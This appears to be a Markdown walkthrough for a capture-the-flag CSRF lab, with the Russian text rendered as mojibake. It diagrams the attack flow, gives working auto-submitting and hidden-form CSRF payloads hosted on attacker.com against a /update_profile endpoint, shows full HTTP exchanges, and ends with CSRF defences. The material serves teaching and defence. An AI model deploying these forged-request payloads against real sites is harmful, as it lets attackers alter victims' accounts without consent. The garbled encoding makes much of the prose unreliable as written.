# CSRF Attack Flow - Ğ’Ğ¸Ğ·ÑƒĞ°Ğ»Ğ¸Ğ·Ğ°Ñ†Ğ¸Ñ Ğ°Ñ‚Ğ°ĞºĞ¸

## ğŸ¯ ĞĞ±Ñ‰Ğ°Ñ ÑÑ…ĞµĞ¼Ğ° Ğ°Ñ‚Ğ°ĞºĞ¸

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Attacker  â”‚         â”‚  Admin Bot  â”‚         â”‚   Web App   â”‚
â”‚  (Student)  â”‚         â”‚   (Victim)  â”‚         â”‚   (Target)  â”‚
â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”˜
       â”‚                       â”‚                       â”‚
       â”‚ 1. Ğ ĞµĞ³Ğ¸ÑÑ‚Ñ€Ğ°Ñ†Ğ¸Ñ        â”‚                       â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
       â”‚                       â”‚                       â”‚
       â”‚ 2. Ğ¡Ğ¾Ğ·Ğ´Ğ°Ğ½Ğ¸Ğµ ÑĞºÑĞ¿Ğ»Ğ¾Ğ¹Ñ‚Ğ° â”‚                       â”‚
       â”‚    (malicious.html)   â”‚                       â”‚
       â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”‚                       â”‚
       â”‚               â”‚       â”‚                       â”‚
       â”‚ 3. Ğ Ğ°Ğ·Ğ¼ĞµÑ‰ĞµĞ½Ğ¸Ğµ Ğ½Ğ°      â”‚                       â”‚
       â”‚    Ğ²Ğ½ĞµÑˆĞ½ĞµĞ¼ ÑĞµÑ€Ğ²ĞµÑ€Ğµ    â”‚                       â”‚
       â”‚               â”‚       â”‚                       â”‚
       â”‚ 4. ĞÑ‚Ğ¿Ñ€Ğ°Ğ²ĞºĞ° URL Ñ‡ĞµÑ€ĞµĞ· Report                  â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
       â”‚                       â”‚                       â”‚
       â”‚                       â”‚ 5. Admin Ğ»Ğ¾Ğ³Ğ¸Ğ½Ğ¸Ñ‚ÑÑ    â”‚
       â”‚                       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
       â”‚                       â”‚                       â”‚
       â”‚                       â”‚ 6. Admin Ğ¿Ğ¾ÑĞµÑ‰Ğ°ĞµÑ‚ URL â”‚
       â”‚                       â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
       â”‚                       â”‚                       â”‚
       â”‚ 7. Ğ­ĞºÑĞ¿Ğ»Ğ¾Ğ¹Ñ‚ Ğ·Ğ°Ğ³Ñ€ÑƒĞ¶Ğ°ĞµÑ‚ÑÑ                       â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚                       â”‚
       â”‚                       â”‚                       â”‚
       â”‚                       â”‚ 8. Form auto-submit   â”‚
       â”‚                       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
       â”‚                       â”‚    POST /update_profile
       â”‚                       â”‚                       â”‚
       â”‚                       â”‚ 9. ĞŸÑ€Ğ¾Ñ„Ğ¸Ğ»ÑŒ Ğ¾Ğ±Ğ½Ğ¾Ğ²Ğ»ĞµĞ½   â”‚
       â”‚                       â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
       â”‚                       â”‚                       â”‚
       â”‚ 10. ĞŸÑ€Ğ¾ÑĞ¼Ğ¾Ñ‚Ñ€ ÑĞ¿Ğ¸ÑĞºĞ° Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»ĞµĞ¹             â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€>â”‚
       â”‚                       â”‚                       â”‚
       â”‚ 11. Ğ¤Ğ»Ğ°Ğ³ Ğ¿Ğ¾Ğ»ÑƒÑ‡ĞµĞ½! ğŸ‰   â”‚                       â”‚
       â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
       â”‚                       â”‚                       â”‚
```

## ğŸ“‹ Ğ”ĞµÑ‚Ğ°Ğ»ÑŒĞ½Ñ‹Ğ¹ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑ

### Ğ¤Ğ°Ğ·Ğ° 1: ĞŸĞ¾Ğ´Ğ³Ğ¾Ñ‚Ğ¾Ğ²ĞºĞ° (Attacker)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  1. Ğ˜ÑÑĞ»ĞµĞ´Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğµ Ğ¿Ñ€Ğ¸Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ñ            â”‚
â”‚  â”œâ”€ Ğ ĞµĞ³Ğ¸ÑÑ‚Ñ€Ğ°Ñ†Ğ¸Ñ Ğ°ĞºĞºĞ°ÑƒĞ½Ñ‚Ğ°              â”‚
â”‚  â”œâ”€ Ğ˜Ğ·ÑƒÑ‡ĞµĞ½Ğ¸Ğµ Ñ„ÑƒĞ½ĞºÑ†Ğ¸Ğ¹                  â”‚
â”‚  â”œâ”€ ĞĞ½Ğ°Ğ»Ğ¸Ğ· Ñ„Ğ¾Ñ€Ğ¼                       â”‚
â”‚  â””â”€ ĞŸĞ¾Ğ¸ÑĞº ÑƒÑĞ·Ğ²Ğ¸Ğ¼Ğ¾ÑÑ‚ĞµĞ¹                 â”‚
â”‚                                        â”‚
â”‚  2. ĞĞ±Ğ½Ğ°Ñ€ÑƒĞ¶ĞµĞ½Ğ¸Ğµ CSRF                   â”‚
â”‚  â”œâ”€ ĞÑ‚ÑÑƒÑ‚ÑÑ‚Ğ²Ğ¸Ğµ CSRF Ñ‚Ğ¾ĞºĞµĞ½Ğ¾Ğ²           â”‚
â”‚  â”œâ”€ ĞĞ°Ğ»Ğ¸Ñ‡Ğ¸Ğµ Ğ°Ğ´Ğ¼Ğ¸Ğ½-Ğ±Ğ¾Ñ‚Ğ°                â”‚
â”‚  â””â”€ ĞĞ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ°Ñ Ğ¾Ğ±Ñ€Ğ°Ğ±Ğ¾Ñ‚ĞºĞ° URL      â”‚
â”‚                                        â”‚
â”‚  3. Ğ Ğ°Ğ·Ñ€Ğ°Ğ±Ğ¾Ñ‚ĞºĞ° ÑĞºÑĞ¿Ğ»Ğ¾Ğ¹Ñ‚Ğ°               â”‚
â”‚  â”œâ”€ Ğ¡Ğ¾Ğ·Ğ´Ğ°Ğ½Ğ¸Ğµ malicious.html           â”‚
â”‚  â”œâ”€ Ğ¤Ğ¾Ñ€Ğ¼Ğ° Ñ auto-submit               â”‚
â”‚  â””â”€ Ğ¦ĞµĞ»ĞµĞ²Ğ¾Ğ¹ endpoint: /update_profile â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Ğ¤Ğ°Ğ·Ğ° 2: Ğ­ĞºÑĞ¿Ğ»Ğ¾Ğ¹Ñ‚ (Exploit)

```html
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  malicious.html (Ğ½Ğ° ÑĞµÑ€Ğ²ĞµÑ€Ğµ Ğ°Ñ‚Ğ°ĞºÑƒÑÑ‰ĞµĞ³Ğ¾)         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                 â”‚
â”‚  <form id="csrf" method="POST"                  â”‚
â”‚        action="http://target:5000/update">      â”‚
â”‚    <input name="bio" value="HACKED">            â”‚
â”‚    <input name="website"                        â”‚
â”‚           value="http://attacker.com/flag">     â”‚
â”‚  </form>                                        â”‚
â”‚                                                 â”‚
â”‚  <script>                                       â”‚
â”‚    document.getElementById('csrf').submit();    â”‚
â”‚  </script>                                      â”‚
â”‚                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Ğ¤Ğ°Ğ·Ğ° 3: Ğ’Ñ‹Ğ¿Ğ¾Ğ»Ğ½ĞµĞ½Ğ¸Ğµ (Execution)

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Admin Bot Process                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                              â”‚
â”‚  1. ĞŸĞ¾Ğ»ÑƒÑ‡Ğ¸Ñ‚ÑŒ URL Ğ¸Ğ· Report                   â”‚
â”‚     â†“                                        â”‚
â”‚  2. Ğ¡Ğ¾Ğ·Ğ´Ğ°Ñ‚ÑŒ Ğ½Ğ¾Ğ²ÑƒÑ ÑĞµÑÑĞ¸Ñ                     â”‚
â”‚     â†“                                        â”‚
â”‚  3. POST /login                              â”‚
â”‚     - username: admin                        â”‚
â”‚     - password: admin_secret_password_123    â”‚
â”‚     â†“                                        â”‚
â”‚  4. ĞŸĞ¾Ğ»ÑƒÑ‡Ğ¸Ñ‚ÑŒ session cookie                  â”‚
â”‚     Set-Cookie: session=abc123...            â”‚
â”‚     â†“                                        â”‚
â”‚  5. GET http://attacker.com/malicious.html   â”‚
â”‚     Cookie: session=abc123...                â”‚
â”‚     â†“                                        â”‚
â”‚  6. Ğ‘Ñ€Ğ°ÑƒĞ·ĞµÑ€ Ğ·Ğ°Ğ³Ñ€ÑƒĞ¶Ğ°ĞµÑ‚ ÑÑ‚Ñ€Ğ°Ğ½Ğ¸Ñ†Ñƒ               â”‚
â”‚     â†“                                        â”‚
â”‚  7. JavaScript Ğ²Ñ‹Ğ¿Ğ¾Ğ»Ğ½ÑĞµÑ‚ÑÑ                   â”‚
â”‚     â†“                                        â”‚
â”‚  8. Form.submit() Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµÑ‚ÑÑ               â”‚
â”‚     POST /update_profile                     â”‚
â”‚     Cookie: session=abc123... (Ğ°Ğ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¾Ğ¼!)   â”‚
â”‚     â†“                                        â”‚
â”‚  9. Ğ¡ĞµÑ€Ğ²ĞµÑ€ Ğ¾Ğ±Ğ½Ğ¾Ğ²Ğ»ÑĞµÑ‚ Ğ¿Ñ€Ğ¾Ñ„Ğ¸Ğ»ÑŒ admin           â”‚
â”‚     â†“                                        â”‚
â”‚  10. Admin bot Ğ·Ğ°Ğ²ĞµÑ€ÑˆĞ°ĞµÑ‚ Ñ€Ğ°Ğ±Ğ¾Ñ‚Ñƒ              â”‚
â”‚                                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

## ğŸ” HTTP Ğ·Ğ°Ğ¿Ñ€Ğ¾ÑÑ‹ Ğ² Ğ´ĞµÑ‚Ğ°Ğ»ÑÑ…

### Ğ¨Ğ°Ğ³ 1: Admin Ğ»Ğ¾Ğ³Ğ¸Ğ½Ğ¸Ñ‚ÑÑ

```http
POST /login HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin_secret_password_123

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

HTTP/1.1 302 Found
Location: /profile
Set-Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.abc123; Path=/; HttpOnly
```

### Ğ¨Ğ°Ğ³ 2: Admin Ğ¿Ğ¾ÑĞµÑ‰Ğ°ĞµÑ‚ Ğ²Ñ€ĞµĞ´Ğ¾Ğ½Ğ¾ÑĞ½Ñ‹Ğ¹ URL

```http
GET /malicious.html HTTP/1.1
Host: attacker.com
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.abc123

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<body>
  <form id="csrf" method="POST" 
        action="http://localhost:5000/update_profile">
    <input name="bio" value="PWNED">
    <input name="website" value="http://attacker.com">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Ğ¨Ğ°Ğ³ 3: Ğ¤Ğ¾Ñ€Ğ¼Ğ° Ğ°Ğ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¸ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµÑ‚ÑÑ

```http
POST /update_profile HTTP/1.1
Host: localhost:5000
Content-Type: application/x-www-form-urlencoded
Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.abc123
Origin: http://attacker.com
Referer: http://attacker.com/malicious.html

bio=PWNED&website=http://attacker.com

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

HTTP/1.1 302 Found
Location: /profile
```

### Ğ¨Ğ°Ğ³ 4: Attacker Ğ¿Ğ¾Ğ»ÑƒÑ‡Ğ°ĞµÑ‚ Ñ„Ğ»Ğ°Ğ³

```http
GET /users HTTP/1.1
Host: localhost:5000
Cookie: session=<attacker_session>

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

HTTP/1.1 200 OK
Content-Type: text/html

<div class="user-card">
  <h3>admin</h3>
  <p>Website: http://attacker.com</p>
</div>

<!-- Ğ¢ĞµĞ¿ĞµÑ€ÑŒ attacker Ğ²Ğ¸Ğ´Ğ¸Ñ‚, Ñ‡Ñ‚Ğ¾ Ğ¿Ñ€Ğ¾Ñ„Ğ¸Ğ»ÑŒ Ğ°Ğ´Ğ¼Ğ¸Ğ½Ğ° Ğ¸Ğ·Ğ¼ĞµĞ½ĞµĞ½ -->
<!-- ĞœĞ¾Ğ¶Ğ½Ğ¾ Ğ¿Ğ¾Ğ²Ñ‚Ğ¾Ñ€Ğ¸Ñ‚ÑŒ Ğ°Ñ‚Ğ°ĞºÑƒ Ğ¸ ÑƒÑÑ‚Ğ°Ğ½Ğ¾Ğ²Ğ¸Ñ‚ÑŒ bio Ğ² Ğ¿Ğ¾Ğ»Ğµ website -->
```

## ğŸ’¡ ĞšĞ»ÑÑ‡ĞµĞ²Ñ‹Ğµ Ğ¼Ğ¾Ğ¼ĞµĞ½Ñ‚Ñ‹ Ğ°Ñ‚Ğ°ĞºĞ¸

### 1. ĞŸĞ¾Ñ‡ĞµĞ¼Ñƒ ÑÑ‚Ğ¾ Ñ€Ğ°Ğ±Ğ¾Ñ‚Ğ°ĞµÑ‚?

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Browser Behavior                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                     â”‚
â”‚  ĞšĞ¾Ğ³Ğ´Ğ° Ğ±Ñ€Ğ°ÑƒĞ·ĞµÑ€ Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµÑ‚ form:                     â”‚
â”‚                                                     â”‚
â”‚  âœ“ ĞĞ²Ñ‚Ğ¾Ğ¼Ğ°Ñ‚Ğ¸Ñ‡ĞµÑĞºĞ¸ Ğ²ĞºĞ»ÑÑ‡Ğ°ĞµÑ‚ cookies Ğ´Ğ¾Ğ¼ĞµĞ½Ğ°            â”‚
â”‚  âœ“ Ğ¡Ğ»ĞµĞ´ÑƒĞµÑ‚ HTTP redirects                           â”‚
â”‚  âœ“ Ğ’Ñ‹Ğ¿Ğ¾Ğ»Ğ½ÑĞµÑ‚ JavaScript                             â”‚
â”‚  âœ“ ĞĞ• Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€ÑĞµÑ‚ origin Ñ„Ğ¾Ñ€Ğ¼Ñ‹                        â”‚
â”‚                                                     â”‚
â”‚  ĞŸÑ€Ğ¸Ğ»Ğ¾Ğ¶ĞµĞ½Ğ¸Ğµ:                                        â”‚
â”‚                                                     â”‚
â”‚  âœ— ĞĞ• Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€ÑĞµÑ‚ CSRF Ñ‚Ğ¾ĞºĞµĞ½                          â”‚
â”‚  âœ— ĞĞ• Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€ÑĞµÑ‚ Origin Ğ·Ğ°Ğ³Ğ¾Ğ»Ğ¾Ğ²Ğ¾Ğº                    â”‚
â”‚  âœ— ĞĞ• Ğ¿Ñ€Ğ¾Ğ²ĞµÑ€ÑĞµÑ‚ Referer                             â”‚
â”‚  âœ— Ğ”Ğ¾Ğ²ĞµÑ€ÑĞµÑ‚ Ñ‚Ğ¾Ğ»ÑŒĞºĞ¾ session cookie                   â”‚
â”‚                                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 2. Ğ¦ĞµĞ¿Ğ¾Ñ‡ĞºĞ° Ğ´Ğ¾Ğ²ĞµÑ€Ğ¸Ñ

```
Attacker's Page
      â†“
   [Ñ„Ğ¾Ñ€Ğ¼Ğ° Ñ action="http://target.com/update"]
      â†“
Browser Ğ²Ğ¸Ğ´Ğ¸Ñ‚: "Ğ, ÑÑ‚Ğ¾ Ñ„Ğ¾Ñ€Ğ¼Ğ° Ğ´Ğ»Ñ target.com"
      â†“
Browser Ğ´ÑƒĞ¼Ğ°ĞµÑ‚: "Ğ£ Ğ¼ĞµĞ½Ñ ĞµÑÑ‚ÑŒ cookies Ğ´Ğ»Ñ target.com"
      â†“
Browser Ğ¾Ñ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµÑ‚: POST + Cookies
      â†“
Server Ğ¿Ğ¾Ğ»ÑƒÑ‡Ğ°ĞµÑ‚: Ğ’Ğ°Ğ»Ğ¸Ğ´Ğ½Ñ‹Ğµ cookies = Ğ²Ğ°Ğ»Ğ¸Ğ´Ğ½Ñ‹Ğ¹ Ğ·Ğ°Ğ¿Ñ€Ğ¾Ñ
      â†“
Server Ğ²Ñ‹Ğ¿Ğ¾Ğ»Ğ½ÑĞµÑ‚: UPDATE users SET ...
      â†“
   ĞŸĞ ĞĞ¤Ğ˜Ğ›Ğ¬ Ğ˜Ğ—ĞœĞ•ĞĞ•Ğ âœ“
```

## ğŸ­ Ğ’Ğ°Ñ€Ğ¸Ğ°Ğ½Ñ‚Ñ‹ ÑĞºÑĞ¿Ğ»Ğ¾Ğ¹Ñ‚Ğ°

### Ğ’Ğ°Ñ€Ğ¸Ğ°Ğ½Ñ‚ 1: ĞŸÑ€Ğ¾ÑÑ‚Ğ°Ñ Ñ„Ğ¾Ñ€Ğ¼Ğ°

```
Ğ¡Ğ»Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚ÑŒ: â˜…â˜†â˜†â˜†â˜†
Ğ­Ñ„Ñ„ĞµĞºÑ‚Ğ¸Ğ²Ğ½Ğ¾ÑÑ‚ÑŒ: â˜…â˜…â˜…â˜…â˜…

<form method="POST" action="http://target/update_profile">
  <input name="bio" value="HACKED">
  <input name="website" value="http://evil.com">
  <input type="submit">
</form>
```

### Ğ’Ğ°Ñ€Ğ¸Ğ°Ğ½Ñ‚ 2: Auto-submit

```
Ğ¡Ğ»Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚ÑŒ: â˜…â˜…â˜†â˜†â˜†
Ğ­Ñ„Ñ„ĞµĞºÑ‚Ğ¸Ğ²Ğ½Ğ¾ÑÑ‚ÑŒ: â˜…â˜…â˜…â˜…â˜…

<form id="x" method="POST" action="...">
  ...
</form>
<script>document.getElementById('x').submit();</script>
```

### Ğ’Ğ°Ñ€Ğ¸Ğ°Ğ½Ñ‚ 3: Ğ¡ĞºÑ€Ñ‹Ñ‚Ğ°Ñ Ñ„Ğ¾Ñ€Ğ¼Ğ°

```
Ğ¡Ğ»Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚ÑŒ: â˜…â˜…â˜…â˜†â˜†
Ğ­Ñ„Ñ„ĞµĞºÑ‚Ğ¸Ğ²Ğ½Ğ¾ÑÑ‚ÑŒ: â˜…â˜…â˜…â˜…â˜…

<form id="csrf" style="display:none" method="POST" action="...">
  ...
</form>
<script>
  window.onload = () => {
    setTimeout(() => {
      document.getElementById('csrf').submit();
    }, 1000);
  }
</script>
```

### Ğ’Ğ°Ñ€Ğ¸Ğ°Ğ½Ñ‚ 4: Exfiltration Ñ‡ĞµÑ€ĞµĞ· website

```
Ğ¡Ğ»Ğ¾Ğ¶Ğ½Ğ¾ÑÑ‚ÑŒ: â˜…â˜…â˜…â˜…â˜†
Ğ­Ñ„Ñ„ĞµĞºÑ‚Ğ¸Ğ²Ğ½Ğ¾ÑÑ‚ÑŒ: â˜…â˜…â˜…â˜…â˜†

Ğ¨Ğ°Ğ³ 1: Ğ˜Ğ·Ğ¼ĞµĞ½Ğ¸Ñ‚ÑŒ website Ğ°Ğ´Ğ¼Ğ¸Ğ½Ğ° Ğ½Ğ° URL Ğ°Ñ‚Ğ°ĞºÑƒÑÑ‰ĞµĞ³Ğ¾
Ğ¨Ğ°Ğ³ 2: ĞŸĞ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ğ¸ Ğ²Ğ¸Ğ´ÑÑ‚ Ğ¸Ğ·Ğ¼ĞµĞ½ĞµĞ½Ğ½Ñ‹Ğ¹ website Ğ² /users
Ğ¨Ğ°Ğ³ 3: Ğ¤Ğ»Ğ°Ğ³ Ğ²Ğ¸Ğ´ĞµĞ½ Ğ² Ğ¸Ğ·Ğ¼ĞµĞ½ĞµĞ½Ğ½Ğ¾Ğ¼ Ğ¿Ñ€Ğ¾Ñ„Ğ¸Ğ»Ğµ
```

## ğŸ›¡ï¸ Ğ—Ğ°Ñ‰Ğ¸Ñ‚Ğ° Ğ¾Ñ‚ CSRF

### Ğ§Ñ‚Ğ¾ Ğ´Ğ¾Ğ»Ğ¶Ğ½Ğ¾ Ğ±Ñ‹Ñ‚ÑŒ Ñ€ĞµĞ°Ğ»Ğ¸Ğ·Ğ¾Ğ²Ğ°Ğ½Ğ¾:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Defense Mechanism                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                 â”‚
â”‚  1. CSRF Tokens                                 â”‚
â”‚     â”œâ”€ Ğ“ĞµĞ½ĞµÑ€Ğ°Ñ†Ğ¸Ñ ÑƒĞ½Ğ¸ĞºĞ°Ğ»ÑŒĞ½Ğ¾Ğ³Ğ¾ Ñ‚Ğ¾ĞºĞµĞ½Ğ°             â”‚
â”‚     â”œâ”€ Ğ’ĞºĞ»ÑÑ‡ĞµĞ½Ğ¸Ğµ Ğ² Ñ„Ğ¾Ñ€Ğ¼Ñƒ                        â”‚
â”‚     â”œâ”€ ĞŸÑ€Ğ¾Ğ²ĞµÑ€ĞºĞ° Ğ¿Ñ€Ğ¸ POST                        â”‚
â”‚     â””â”€ Ğ Ğ¾Ñ‚Ğ°Ñ†Ğ¸Ñ Ñ‚Ğ¾ĞºĞµĞ½Ğ¾Ğ²                          â”‚
â”‚                                                 â”‚
â”‚  2. SameSite Cookies                            â”‚
â”‚     â””â”€ Set-Cookie: session=...; SameSite=Lax    â”‚
â”‚                                                 â”‚
â”‚  3. Origin/Referer Check                        â”‚
â”‚     â”œâ”€ ĞŸÑ€Ğ¾Ğ²ĞµÑ€ĞºĞ° Origin Ğ·Ğ°Ğ³Ğ¾Ğ»Ğ¾Ğ²ĞºĞ°                â”‚
â”‚     â””â”€ Whitelist Ğ´Ğ¾Ğ²ĞµÑ€ĞµĞ½Ğ½Ñ‹Ñ… origin              â”‚
â”‚                                                 â”‚
â”‚  4. Custom Headers (Ğ´Ğ»Ñ AJAX)                   â”‚
â”‚     â””â”€ X-CSRF-Token: abc123                     â”‚
â”‚                                                 â”‚
â”‚  5. Double Submit Cookie                        â”‚
â”‚     â”œâ”€ Cookie: csrf_token=abc                   â”‚
â”‚     â””â”€ Form: csrf_token=abc                     â”‚
â”‚                                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

